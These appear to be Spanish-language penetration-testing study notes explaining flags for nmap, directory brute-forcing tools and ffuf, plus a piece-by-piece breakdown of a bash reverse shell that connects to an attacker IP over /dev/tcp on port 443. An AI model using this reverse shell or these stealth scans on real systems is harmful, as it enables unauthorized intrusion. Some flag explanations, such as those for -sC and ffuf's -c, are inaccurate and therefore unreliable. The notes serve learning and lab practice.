**1. “-sS”:**
    - este parámetro nos permite hacer un sondeo Tcp pero no establecer conexión En vez de “SYN>SYN/ACK>ACK” hace un “SYN>SYN/ACK/RST” El rst es para cerrar conexión, como no se ha esablecido conexión normalmente no se guarda en los logs ni rastro en los firewalls.
    
**2.	“-p-“**
  - Con esto le indicamos que nos escanee los 65535 puertos totales que hay
     
**3. “—open”** 
  -	para que nos muestre solo los puertos abiertos y que ignore los filtrados,
    
**4. “-T5”** 
  - Este nos permite modificar la plantilla de temporizado del escaneo, existen 5 modos : paranoico (0), sigiloso (1), amable (2), normal (3), agresivo (4) y loco (5), Los 2 primeros reducen el sondeo tcp para que utilize menos ancho de banda. La 0 sondea 1 puerto a la vez, y espera 5 min antes de enviar cada sonda, el 1 y el 2 son similares, esperan 0.4 segundos entre sondas, el 3 (uso por defecto de nmap) hace sondeos en paralelo, el 4 y el 5 envian sondas cada 5 ms, lo único que les diferencian es el tiempo que esperan para recibir la respuesta de el sondeo TCP.
    
**5. “—min-rate 5000”**
  -	Nos permite especificar la cantidad mínima de paquetes que se envían por segundo, por lo que he investigado el numero que menos falsos positivos y falsos negativos da se encuentra entre el 5000-5800.
    
**6. ”-n”** 
  -	Le indicamos que no queremos que nos haga la resolución DNS al host, básicamente pregunta a los servidores DNS cual es el dns del host (nslookup), lo que ocurre es que la resolución hace muy lento el escaneo por lo que lo desactivamos ya que si queremos hacer resolución dns lo podemos hacer manualmente.
    
**7. “-Pn”**
  - En este caso le indicamos que no lance trazas icmp al host, ya que normalmente antes de un escaneo nmap envia trazas icmp para determinar si el host está activo o no, lo que ocurre es que ralentiza mucho el escaneo por lo que lo deshabilitamos ya que si queremos determinar si el host esta vivo tenemos muchísimos otros métodos incluso si las trazas icmp están bloqueadas por firewall físico o de sistema operativo.
    
**8. “-oG”**
  - Le indicamos que nos ponga el output en un archivo en formato grepeable para que después cuando lo pase por una función de mi zshrc me copie al portapapeles los puertos abiertos
    
**9. “-vvv”**
  -	Es para ponerlo en verbose mode, básicamente que mientras está haciendo el escaneo nos muestre que puertos encuentra abiertos
    
**10. “-sC”**
  -	Nos permite detectar que servicios están corriendo en los puertos abiertos
    
**11. “-sV”**
  -	Nos permite detectar la versión de los servicios que estan ejecutándose en los puertos lo que nos permite encontrar vulnerabilidades
    
**12. “-oN”**
  -	Es para exportarlo en formato Nmap por si después tenemos que volver a analizarlo.

**13.	“-u”**
  -	Es para indicarle el url victima
  	
**14.	“-w”**
  -	Es para indicarle el diccionario para la fuerza bruta, en este caso utilizo un que ya esta creado llamado “SecLists” que es un conjunto de diccionarios para hacer fuerza tanto como subdominios, fuzzing, etc.
    
**15. “-t”**
  - Es para indicarle los hilos de el proceso (Cuantas tareas a la vez debe ejecutar a la vez (en este caso 400)

**16. “-x”**
  - Es para indicarle que extensiones específicas quiero que me reporte que ha encontrado en algún directorio.
    
**17.	“bash -c”**
  -	Primero lo que hacemos es asegurarnos que el comando se ejecuta con bash y no con otro tipo de Shell, ya que sinó no funcionará.

**18.	“bash -i”**
  -	Ejecutamos una bash interactiva, ya que bash -c solo nos permite ejecutar comandos, como por ejemplo: “whoami”, pero este no nos permite ejecutar nada más, por esa razón una bash interactiva nos deja poner comandos todas las veces que queramos y recibir el output.
    
**19.	“>&”**
  -	Con estos caracteres especiales redirigimos el stdrr y el stdout a nuestro equipo
    -	“/dev/tcp/192.168.1.60 /443”
  - En este caso “/dev/tcp” está siendo utilizado para entablar por tcp una conexión con nuestra ip por el puerto 443
    
**20.	“0>&1”**
  -	Redirige el stdin a stdout, esto se hace para que se pueda interactuar con una Shell en remoto mediante la conexión establecida.
  -	Esta redirección es utilizada para hacer que la entrada estándar del proceso Bash (que normalmente se recibiría del teclado) esté conectada a la misma ubicación que la salida estándar. Esto significa que cualquier entrada que se escriba en la sesión de la shell se transmitirá a través de la misma conexión que se ha establecido con la dirección IP y puerto especificados. Esto permite la interacción bidireccional con la shell remota a través de la conexión de red establecida.

**21. ffuf**
  - Prueba diferentes combinaciones de direcciones URL de un dominio para identificar qué rutas están activas y cuáles no.

**22. -c**
  - Con este parámetro haremos que siga automáticamente las redirecciones HTTP y HTTPS.

**23. -u**
  - Este paramettro hacemos especificar una URL para hacer la fuerza bruta.
    
**24. -w**
  - Especificamos la ubicación del archivo de palabras que utiliza la herramienta ffuf para realizar la fuerza bruta, ese archivo se llama common.txt, ubicado en /usr/share/wordlists/dirb.

**25. -ic**
  - Con este parámetro hacemos que los códigos en estado HTTP no se distinga entre mayúsculas y minúsculas.
    
**26. -fc 403**
  - Con este parámetro escogemos que queremos filtrar durante el escaneo en este caso queremos las respuestas de 403 (Forbidden).
    
**27. -e**
  - Este parámetro lo utilizaremos para decir que archivos queremos que nos filtre, en este caso seria .txt y .html

